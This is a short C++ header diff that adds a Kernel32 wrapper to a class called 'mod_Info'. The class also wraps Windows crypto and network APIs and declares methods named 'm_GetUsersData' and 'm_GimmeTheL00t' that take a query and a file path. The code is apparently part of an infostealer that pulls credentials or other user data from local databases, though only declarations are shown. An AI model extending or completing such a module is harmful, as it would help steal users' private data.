@@ -87,13 +87,14 @@ class mod_Info {
 
 		std::string m_GetUsersData();
 
-		mod_Info(st_Bcrypt& _bcrypt, st_Crypt32& _crypt32, st_Netapi32& _netapi32);
+		mod_Info(st_Bcrypt& _bcrypt, st_Crypt32& _crypt32, st_Netapi32& _netapi32, st_Kernel32& _kernel32);
 		~mod_Info();
 
 	private:
 		st_Bcrypt     BCRYPT;
 		st_Crypt32   CRYPT32;
 		st_Netapi32 NETAPI32;
+		st_Kernel32 KERNEL32;
 
 		std::vector<std::vector<std::string>> m_GimmeTheL00t(const char* cQuery, const char* cPath);
 		///////////////////////////////////////////////
